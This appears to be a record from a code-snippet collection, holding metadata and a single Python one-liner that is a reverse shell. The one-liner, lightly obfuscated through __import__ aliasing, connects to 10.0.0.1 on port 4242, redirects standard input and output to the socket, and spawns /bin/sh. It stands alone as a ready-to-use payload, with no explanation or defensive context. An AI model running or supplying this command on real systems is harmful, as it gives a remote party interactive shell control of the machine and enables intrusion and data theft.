---
id: bc500e34-0630-4127-a52a-2f076c2881f6
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246344+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet bc500e34

**Language**: Python

```python
python -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("10.0.0.1",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```
